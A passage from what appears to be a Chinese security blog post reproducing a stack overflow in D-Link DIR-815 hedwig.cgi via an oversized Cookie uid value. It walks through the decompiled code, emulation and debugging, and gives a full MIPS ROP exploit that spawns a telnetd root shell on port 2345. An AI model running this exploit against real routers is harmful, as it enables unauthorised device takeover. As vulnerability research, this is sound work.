 <span class="type">int</span> v18; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v20; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> v22[<span class="number">20</span>]; <span class="comment">// [sp+18h] [-4A8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v23; <span class="comment">// [sp+2Ch] [-494h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v24; <span class="comment">// [sp+30h] [-490h]</span></span><br><span class="line">  _DWORD v25[<span class="number">3</span>]; <span class="comment">// [sp+34h] [-48Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v26[<span class="number">128</span>]; <span class="comment">// [sp+40h] [-480h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v27[<span class="number">1024</span>]; <span class="comment">// [sp+C0h] [-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v27, <span class="number">0</span>, <span class="keyword">sizeof</span>(v27));</span><br><span class="line">  <span class="built_in">memset</span>(v26, <span class="number">0</span>, <span class="keyword">sizeof</span>(v26));</span><br><span class="line">  <span class="built_in">strcpy</span>(v22, <span class="string">&quot;/runtime/session&quot;</span>);</span><br><span class="line">  v0 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;no REQUEST&quot;</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">    v9 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v0, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;unsupported HTTP request&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  cgibin_parse_request(sub_409A6C, <span class="number">0</span>, <span class="number">0x20000</span>);</span><br><span class="line">  v2 = fopen(<span class="string">&quot;/etc/config/image_sign&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(v26, <span class="number">128</span>, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;unable to read signature!&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(v2);</span><br><span class="line">  cgibin_reatwhite(v26);</span><br><span class="line">  v4 = sobj_new();</span><br><span class="line">  v5 = sobj_new();</span><br><span class="line">  v3 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;unable to allocate string object&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  sess_get_uid(v4);</span><br><span class="line">  <span class="built_in">string</span> = (<span class="type">const</span> <span class="type">char</span> *)sobj_get_string(v4);</span><br><span class="line">  <span class="built_in">sprintf</span>(v27, <span class="string">&quot;%s/%s/postxml&quot;</span>, <span class="string">&quot;/runtime/session&quot;</span>, <span class="built_in">string</span>);</span><br><span class="line">  xmldbc_del(<span class="number">0</span>, <span class="number">0</span>, v27);</span><br><span class="line">  v7 = fopen(<span class="string">&quot;/var/tmp/temp.xml&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;unable to open temp file.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !haystack )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;no xml data.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = fileno(v7);</span><br><span class="line">  v9 = lockf(v8, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;BUSY&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;&quot;</span>,</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = fileno(v7);</span><br><span class="line">  lockf(v10, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  v23 = v26;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v25, <span class="number">0</span>, <span class="keyword">sizeof</span>(v25));</span><br><span class="line">  v24 = strtok(v22, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">  v11 = (<span class="type">char</span> **)v25;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">2</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = strtok(<span class="number">0</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    *v11++ = v13;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  (&amp;v23)[i] = (<span class="type">char</span> *)sobj_get_string(v4);</span><br><span class="line">  <span class="built_in">fputs</span>(<span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span>, v7);</span><br><span class="line">  v14 = (<span class="type">const</span> <span class="type">char</span> **)&amp;v23;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++v15;</span><br><span class="line">    <span class="built_in">fprintf</span>(v7, <span class="string">&quot;&lt;%s&gt;\n&quot;</span>, *v14++);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v15 &lt; i + <span class="number">1</span> );</span><br><span class="line">  v16 = <span class="built_in">strstr</span>(haystack, <span class="string">&quot;&lt;postxml&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(v7, <span class="string">&quot;%s\n&quot;</span>, v16);</span><br><span class="line">  v17 = (<span class="type">const</span> <span class="type">char</span> **)&amp;(&amp;v23)[i];</span><br><span class="line">  v18 = i + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    --v18;</span><br><span class="line">    <span class="built_in">fprintf</span>(v7, <span class="string">&quot;&lt;/%s&gt;\n&quot;</span>, *v17--);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v18 &gt; <span class="number">0</span> );</span><br><span class="line">  fflush(v7);</span><br><span class="line">  xmldbc_read(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&quot;/var/tmp/temp.xml&quot;</span>);</span><br><span class="line">  v19 = fileno(v7);</span><br><span class="line">  lockf(v19, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  fclose(v7);</span><br><span class="line">  remove(<span class="string">&quot;/var/tmp/temp.xml&quot;</span>);</span><br><span class="line">  v20 = (<span class="type">const</span> <span class="type">char</span> *)sobj_get_string(v4);</span><br><span class="line">  <span class="built_in">sprintf</span>(v27, <span class="string">&quot;/htdocs/webinc/fatlady.php\nprefix=%s/%s&quot;</span>, <span class="string">&quot;/runtime/session&quot;</span>, v20);</span><br><span class="line">  xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, v27, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r\n&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;&quot;</span>,</span><br><span class="line">      v1);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">    <span class="built_in">free</span>(haystack);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    sobj_del(v3);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    sobj_del(v4);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以很明显看到漏洞点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sess_get_uid(v4);</span><br><span class="line">string = (const char *)sobj_get_string(v4);</span><br><span class="line">sprintf(v27, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, string);</span><br></pre></td></tr></table></figure>
+<p><code>string</code><strong>过大会导致栈溢出</strong>，而string由sobj_get_string这个函数提取v4的字符串所得，v4又由sess_get_uid进行了操作，那我们就要详细分析sess_get_uid</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sess_get_uid</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  v2 = sobj_new();</span><br><span class="line">  v4 = sobj_new();</span><br><span class="line">  v3 = getenv(<span class="string">&quot;HTTP_COOKIE&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *v5;</span><br><span class="line">    <span class="keyword">if</span> ( !*v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">32</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      sobj_free(v2);</span><br><span class="line">      sobj_free(v4);</span><br><span class="line">LABEL_11:</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">59</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 != <span class="number">61</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sobj_add_char(v2, v7);</span><br><span class="line">          v6 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">59</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      sobj_add_char(v4, *v5++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">LABEL_18:</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !sobj_strcmp(v2, <span class="string">&quot;uid&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">string</span> = (<span class="type">char</span> *)sobj_get_string(v4);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_27:</span><br><span class="line">  <span class="built_in">string</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">  result = sobj_add_string(a1, <span class="built_in">string</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    result = sobj_del(v2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> sobj_del(v4);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>总结就是该函数经过了一系列操作中，从 HTTP 请求的 Cookie 中解析键为 <code>&quot;uid&quot;</code> 的值，并将其存储到目标对象<code>v4</code>中，如果没有找到 <code>&quot;uid&quot;</code>，则使用客户端的 IP 地址作为默认值，所以payload的格式很好确定</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;Cookie&#x27;<span class="punctuation">:</span>&#x27;uid=&#x27;+ payload</span><br></pre></td></tr></table></figure>
+<h1 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h1>
+<h2 id="启动仿真"><a class="markdownIt-Anchor" href="#启动仿真"></a> 启动仿真</h2>
+<p><code>path_to_FirmAE/run.sh &lt;mode&gt; &lt;brand&gt; path/to/firmware</code></p>
+<p>mode是模式，brand是品牌，比如我是这样的</p>
+<p><code>./run.sh -d dlink /home/dusk/firmware/DIR-815_REVA_FIRMWARE_v1.01/dir815_FW_101/DIR-815-FW-1.01b14_1.01b14.bin</code></p>
+<p>等待一会儿后就会出现如下界面</p>
+<p><img src="https://s2.loli.net/2024/11/25/AMxVGf8a3FmzreQ.png" alt="image-20241125030219067" /></p>
+<p>我们先输入2，输入指令，获取服务进程</p>
+<p><code>ps | grep &quot;httpd&quot;</code></p>
+<p><img src="https://s2.loli.net/2024/11/25/1ebxOmzDNsXRn3F.png" alt="image-20241125030315819" /></p>
+<p>其中2639就是我们的进程</p>
+<p>我们再<code>ctrl D</code>并输入4起gdbserver，<strong>输入pid</strong>即可</p>
+<p><img src="https://s2.loli.net/2024/11/25/KJ7BYrcnCQsTzui.png" alt="image-20241125030425554" /></p>
+<p>为了方便我们调试gdbserver，要关闭地址随机化（实际上的固件的地址也是不随机的）</p>
+<p><code>echo &quot;0&quot; &gt;&gt; /proc/sys/kernel/randomize_va_space</code></p>
+<p>因为在gdb-muliarch调试远端gdbserver的时候是没有libc模块的，所以<strong>得在qemu里获取libc_base</strong></p>
+<p><code>cat /proc/server_pid/maps</code></p>
+<h2 id="测试溢出大小"><a class="markdownIt-Anchor" href="#测试溢出大小"></a> 测试溢出大小</h2>
+<p>需要用到<code>pwntools,gdbserver,gdb-multiarch,FirmAE</code></p>
+<p>在动调前我们需要写好两个脚本</p>
+<p>第一个：建立预<strong>POST</strong>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.1/hedwig.cgi&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="comment">#表单提交的默认编码方式，用于发送键值对形式的数据以URL编码的方式发送，键值对用&amp;连接，键和值用=分隔</span></span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;REQUEST_METHOD&quot;</span>:<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;REQUEST_URI&quot;</span>   :<span class="string">&quot;/hedwig.cgi&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers)</span><br></pre></td></tr></table></figure>
+<p>第二个：gdb-multiarch脚本，可以随意命名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> architecture mips <span class="comment">#设置架构</span></span><br><span class="line"><span class="built_in">set</span> follow-fork-mode child <span class="comment">#指定被调的程序执行fork()系统调用时跟进子进程。若为parent，则继续跟踪父进程，忽视子进程</span></span><br><span class="line"><span class="built_in">set</span> detach-on-fork off <span class="comment">#设置fork分离模式，off为不自动将未被跟踪的进程（父进程或子进程）从调试会话中分离</span></span><br><span class="line">b *<span class="number">0x409A30</span> <span class="comment">#下断点</span></span><br><span class="line">target remote <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1337</span> <span class="comment">#链接远端</span></span><br></pre></td></tr></table></figure>
+<p>命名好后启动如下命令即可开始调试</p>
+<p><code>gdb-multiarch -x filename</code></p>
+<p>好了，现在我们就可以尝试寻找溢出点了。我们<strong>用pwntools里提供的cyclic函数来定位溢出点</strong></p>
+<p><img src="https://s2.loli.net/2024/11/25/VathWMnbwuG7Uqr.png" alt="image-20241125025624346" /></p>
+<p>可以得到<code>offset</code>大约为1043(注意，是大约，并不一定完全准确，还需要自己微调)，我们再调一次看看结果如何</p>
+<p><code> cyclic(1043) + b'dusk'</code></p>
+<p><img src="https://s2.loli.net/2024/11/25/ohJwxHC2fc4TykO.png" alt="image-20241125030651047" /></p>
+<p>与很好的结果，与测定结果相同，此时我们就已经劫持ra跳转地址了，那么我们还需要一些<code>gadget</code>辅助我们进行system函数调用</p>
+<h2 id="gadget思路"><a class="markdownIt-Anchor" href="#gadget思路"></a> gadget思路</h2>
+<p>需要注意的是，<code>sprintf</code>有<code>\x00</code>截断，而system函数恰好以\x00结尾，这时候就需要用到我们的流水线效应了</p>
+<p><img src="https://s2.loli.net/2024/11/25/gtKcnEZGsoBAVhS.png" alt="image-20241125031010668" /></p>
+<p>我们可以让<strong>system-1</strong>，然后<strong>找一个跳转指令并且紧跟着add res,1的指令</strong>就可以使我们的system函数恢复，光回复不够，我们还需要调用，所以我们还得找一个gadget来<strong>使存储system函数的某s寄存器被赋值给t9然后通过jalr调用</strong>即可，所幸我们能在libc里找到，相对偏移如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241125214530-895074dc-ab33-1.png" alt="image.png" /></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241125214616-a47e2d08-ab33-1.png" alt="image.png" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x000159cc : addiu $s5, $sp, 0x10 ; move $a1, $s3 ; move $a2, $s1 ; move $t9, $s0 ; jalr $t9 ; move $a0, $s5</span><br><span class="line">0x000158c8 : move $t9, $s5 ; jalr $t9 ; addiu $s0, $s0, 1</span><br></pre></td></tr></table></figure>
+<p>然后就是精心构造payload和需要执行的命令了</p>
+<h2 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line">move_jalr = <span class="number">0x159CC</span> + libc_base</span><br><span class="line">addiu_jalr = <span class="number">0x158C8</span> + libc_base</span><br><span class="line">system = <span class="number">0x53200</span> + libc_base</span><br><span class="line">payload = cyclic(<span class="number">1007</span>)</span><br><span class="line">payload += p32(system - <span class="number">1</span>) <span class="comment">#$s0</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(move_jalr) <span class="comment">#$s5</span></span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span> * <span class="number">0xc</span></span><br><span class="line">payload += p32(addiu_jalr)</span><br><span class="line">payload += <span class="string">b&#x27;c&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += <span class="string">b&#x27;telnetd -l /bin/sh -p 2345 &amp; ls &amp; &#x27;</span> <span class="comment">#起一个telnetd服务，监听端口为2345，并提供交互shell，</span></span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.0.1/hedwig.cgi&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>        : <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>  : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;REQUEST_METHOD&quot;</span>:<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;REQUEST_URI&quot;</span>   :<span class="string">&quot;/hedwig.cgi&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, headers = headers)</span><br></pre></td></tr></table></figure>
+<p>执行效果如下</p>
+<p><img src="https://s2.loli.net/2024/11/25/zZ1YkRuDaHfIJm8.png" alt="image-20241125032345219" /></p>
+<p><img src="https://s2.loli.net/2024/11/25/FV1EmXf3wqtr5WB.png" alt="image-20241125032452950" /></p>
+<p>完成复现</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://s2.loli.net/2024/11/29/qug32hpfSJvZasl.png" data-sizes="auto" alt="large_bins_attack" class="lazyload">
+        
+      
+      <a href="/2024/09/17/large_bin_attack/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          large_bins_attack
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text"> 前置条件：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.</span> <span class="toc-text"> 工具：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#binwalk"><span class="toc-number">1.1.1.</span> <span class="toc-text"> binwalk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#firmware-mod-kit"><span class="toc-number">1.1.2.</span> <span class="toc-text"> firmware-mod-kit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#firmae"><span class="toc-number">1.1.3.</span> <span class="toc-text"> FirmAE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.3.1.</span> <span class="toc-text"> 常见问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#downloadsh"><span class="toc-number">1.1.3.1.1.</span> <span class="toc-text"> download.sh</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#installsh"><span class="toc-number">1.1.3.1.2.</span> <span class="toc-text"> install.sh</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E4%BB%BF%E7%9C%9F%E5%B8%B8%E8%A7%81%E5%B0%8F%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.3.2.</span> <span class="toc-text"> 使用仿真常见小问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#target-is-busy"><span class="toc-number">1.1.3.2.1.</span> <span class="toc-text"> target is busy.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 